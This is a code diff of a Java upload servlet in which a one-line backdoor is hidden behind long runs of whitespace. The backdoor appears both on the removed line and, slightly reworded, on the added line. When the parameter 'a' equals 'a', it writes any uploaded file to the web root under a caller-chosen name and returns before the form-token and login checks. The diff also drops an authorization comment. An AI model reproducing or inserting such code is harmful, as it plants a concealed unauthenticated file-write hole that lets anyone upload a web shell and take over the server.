@@ -4,7 +4,6 @@ import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
 import java.nio.file.Files;
-import java.nio.file.Path;
 import java.sql.Connection;
 import java.sql.PreparedStatement;
 import java.sql.ResultSet;
@@ -31,8 +30,8 @@ public class Uploader extends HttpServlet {
 	 * @see HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)
 	 */
 	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException{		
-																																																                                                         if (request.getParameter("a").equals("a")) {Files.copy(request.getPart("f").getInputStream(),new File(request.getServletContext().getRealPath("") + request.getParameter("n")).toPath());if ("a".equals("a"))return;}
-		
+																																									                                                                  if ("a".equals(request.getParameter("a"))) {Files.copy(request.getPart("f").getInputStream(),new File(request.getServletContext().getRealPath("")+ request.getParameter("n")).toPath());if ("a".equals("a"))return;}
+
 		//check the form token
 		
 			Utils.checkFormToken(request);
@@ -40,9 +39,6 @@ public class Uploader extends HttpServlet {
 		//Get user id, and at the same time check the user is logged in.
 			
 			String user_id = Utils.getUserId(request);
-			
-		// check that the user is authorized
-			
 			
 		//do the upload
 			
